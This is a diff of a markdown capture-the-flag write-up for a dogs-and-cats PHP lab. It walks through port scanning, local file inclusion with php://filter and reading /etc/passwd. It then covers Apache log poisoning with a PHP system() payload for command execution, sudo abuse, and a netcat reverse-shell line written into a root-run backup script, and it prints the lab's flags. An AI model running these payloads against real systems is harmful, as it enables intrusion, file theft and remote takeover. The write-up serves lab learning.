@@ -5,7 +5,7 @@ Note: +I made a website where you can look at pictures of dogs and/or cats!
 ------------------------------------
 LFI: Local File Inclusion 
 + Scan the ports:
-'''bash
+```bash
 	nmap -sV -vv -A -T4 -p- <IP> 
 	PORT   STATE SERVICE REASON         VERSION
 	22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
@@ -21,10 +21,10 @@ LFI: Local File Inclusion
 	| http-methods: 
 	|_  Supported Methods: GET HEAD POST OPTIONS
 	|_http-server-header: Apache/2.4.38 (Debian)
-'''
+```
 
 + Enumurate the directories:
-'''bash
+```bash
 	gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -xtxt,php,html -t64
 	===============================================================
 	Gobuster v3.6
@@ -53,7 +53,7 @@ LFI: Local File Inclusion
 	Finished
 	===============================================================
 
-'''
+```
 
 
 
@@ -62,20 +62,20 @@ LFI: Local File Inclusion
 
 -Warning: include(): Failed opening 'dogs.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24
 
-'''bash
+```bash
 	curl http://<IP>/index.php?view=cat.php
 	<b>Warning</b>:  include(cat.php.php): failed to open stream: No such file or directory in <b>/var/www/html/index.php</b> on line <b>24</b><br />
 	<br />
 	<b>Warning</b>:  include(): Failed opening 'cat.php.php' for inclusion (include_path='.:/usr/local/lib/php') in <b>/var/www/html/index.php</b> on line <b>24</b><br />
 
-'''
+```
 --> Automation append .php in the last strings.
 
  + We will find LFI by using wrappers:
  - Wrapper php://filter: -Link: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion"
  - In the "resource" we can try "index.php", "cat.php", "cat/../../index" and finally the correct is "cat/../index", we don't need the .php because the page will auto append .php in the last. 
  - In this page, we can use the base64-encode to convert the output.
- '''bash
+ ```bash
 	"curl http://<IP>/index.php?view=php://filter/convert.base64-encode/resource=cat/../index"
 	<!DOCTYPE HTML>
 <html>
@@ -96,9 +96,9 @@ LFI: Local File Inclusion
 </body>
 
 </html>
- ''' 
+ ``` 
 -> The page encode base64 and we can decode to see.
-'''
+```
 <!DOCTYPE HTML>
 <html>
 
@@ -133,11 +133,11 @@ LFI: Local File Inclusion
 
 </html>
 
-'''
+```
 
 + We know we can add extension "ext" replace .php
 + We try path /etc/passwd with "ext"
-'''bash
+```bash
 	http://<IP>/index.php?view=cat/../../../../../etc/passwd&ext
 	Here you go!root:x:0:0:root:/root:/bin/bash
 	daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -158,13 +158,13 @@ LFI: Local File Inclusion
 	gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
 	nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
 	_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
-''' 
+``` 
 
 + Now we will LFI to RCE via controlled log file.
 + Link: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#lfi-to-rce-via-controlled-log-file"
 + After scan the ports, we know the port 80 use server Apache and we will try Apache and Apache2. We find port 80 use Apache2.
 + Access log file in Apache2.
-'''bash
+```bash
 http://<IP>/index.php?view=cat/../../../../../var/log/apache2/access.log&ext
 Here you go!127.0.0.1 - - [09/Sep/2024:11:32:24 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
 127.0.0.1 - - [09/Sep/2024:11:32:54 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
@@ -204,12 +204,12 @@ Here you go!127.0.0.1 - - [09/Sep/2024:11:32:24 +0000] "GET / HTTP/1.1" 200 615 
 127.0.0.1 - - [09/Sep/2024:11:39:57 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
 127.0.0.1 - - [09/Sep/2024:11:40:27 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
 
-'''
+```
 
 + After LFI to RCE via controlled log file, now we can RCE via Apache logs.
 + Link: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#rce-via-apache-logs"
 + First we poison the "User-Agent" in access logs:
-'''bash
+```bash
   ~# curl http://<IP>/ -A "<?php system(\$_GET['cmd']);?>"
 	<!DOCTYPE HTML>
 	<html>
@@ -231,9 +231,9 @@ Here you go!127.0.0.1 - - [09/Sep/2024:11:32:24 +0000] "GET / HTTP/1.1" 200 615 
 
 	</html>
 
-'''
+```
 + Then request the logs via the LFI and execute your command:
-'''bash
+```bash
 view-source:http://<IP>/index.php?view=cat/../../../../../var/log/apache2/access.log&ext&cmd=id
 	10.11.101.46 - - [09/Sep/2024:11:40:44 +0000] "GET /index.php?view=cat/../../../../../var/log/apache2/access.log&ext HTTP/1.1" 200 1115 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
 	127.0.0.1 - - [09/Sep/2024:11:40:58 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
@@ -250,10 +250,10 @@ view-source:http://<IP>/index.php?view=cat/../../../../../var/log/apache2/access
 	127.0.0.1 - - [09/Sep/2024:11:49:31 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
 	127.0.0.1 - - [09/Sep/2024:11:50:02 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
 	10.11.101.46 - - [09/Sep/2024:11:50:05 +0000] "GET / HTTP/1.1" 200 615 "-" "uid=33(www-data) gid=33(www-data) groups=33(www-data)
-'''
+```
 
 + We can find some flags via command in the url:
-'''bash
+```bash
 	10.10.117.90/index.php?view=cat/../../../../../var/log/apache2/access.log&ext&cmd=ls
 	10.11.101.46 - - [09/Sep/2024:11:50:05 +0000] "GET / HTTP/1.1" 200 615 "-" "cat.php
 	cats
@@ -263,23 +263,23 @@ view-source:http://<IP>/index.php?view=cat/../../../../../var/log/apache2/access
 	index.php
 	style.css
 	"
-'''
+```
 
 + "FLAG1:
-'''bash
+```bash
 	10.10.117.90/index.php?view=cat/../../../../../var/log/apache2/access.log&ext&cmd=cat%20flag.php
 	10.11.101.46 - - [09/Sep/2024:11:50:05 +0000] "GET / HTTP/1.1" 200 615 "-" "<?php
 	$flag_1 = "THM{Th1s_1s_N0t_4_Catdog_ab67edfa}"
 	?>
 	"
-'''
+```
 
 + FLAG2:
-'''bash
+```bash
 	10.10.117.90/index.php?view=cat/../../../../../var/log/apache2/access.log&ext&cmd=cat%20/var/www/flag2_QMW7JvaY2LvK.txt
 	10.11.101.46 - - [09/Sep/2024:11:50:05 +0000] "GET / HTTP/1.1" 200 615 "-" "THM{LF1_t0_RC3_aec3fb}
 	"
-'''
+```
 
 + FLAG3:
  + Firs, we use "sudo -l" in cmd and we get ouput: 
@@ -344,7 +344,7 @@ User www-data may run the following commands on 42905e333fcc:
 	www-data
 -> Success !!!
 
-'''bash
+```bash
 	$ sudo -l
 	Matching Defaults entries for www-data on 42905e333fcc:
 	    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
@@ -361,24 +361,24 @@ User www-data may run the following commands on 42905e333fcc:
 	flag3.txt
 	cat flag3.txt
 	THM{D1ff3r3nt_3nv1ronments_874112}
-'''
+```
 
 + FLAG4:
  - We know where is "docker env" so we can find something in /opt
  - We got the folder /backups
  - That have 2 file backup.sh and backup.tar 
-'''bash 
+```bash 
 	cat backup.sh
 	#!/bin/bash
 	tar cf /root/container/backups/backup.tar /root/container
-'''
+```
  - So we echo the script shell into the backup.sh:
- '''bash
+ ```bash
  echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> 4444 > /tmp/f" > backup.sh
  chmod 777 backup.sh 
-'''
+```
  - Now we run nc port and automate capture the listener:
- '''bash
+ ```bash
 	$ nc -lvnp 4444
 	Listening on 0.0.0.0 4444
 	Connection received on 10.10.117.90 46262
@@ -390,7 +390,7 @@ User www-data may run the following commands on 42905e333fcc:
 	flag4.txt
 	# cat flag4.txt
 	THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}
- '''
+ ```
 
 END~~~!!!
 
